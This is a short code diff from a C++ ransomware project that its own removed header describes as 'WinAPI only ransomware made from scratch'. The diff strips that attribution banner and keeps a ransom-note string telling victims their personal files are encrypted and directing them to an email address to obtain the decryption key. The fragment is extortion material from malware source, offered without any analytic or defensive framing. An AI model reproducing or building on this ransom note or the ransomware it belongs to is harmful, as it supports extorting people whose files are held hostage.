@@ -1,10 +1,3 @@
-/*
-   ############################################
-   # Copyright 2023 Panagiotis (MalwarePad)   #
-   # WinAPI only ransomware made from scratch #
-   ############################################
-*/
-
 #include "PostEncryption.h"
 
 std::string oopsText = "Oops! All of your personal files were encrypted...\n\nTo decrypt them, re-run the file with the private key we send to you!\n\nOur email: xyz@example.com";
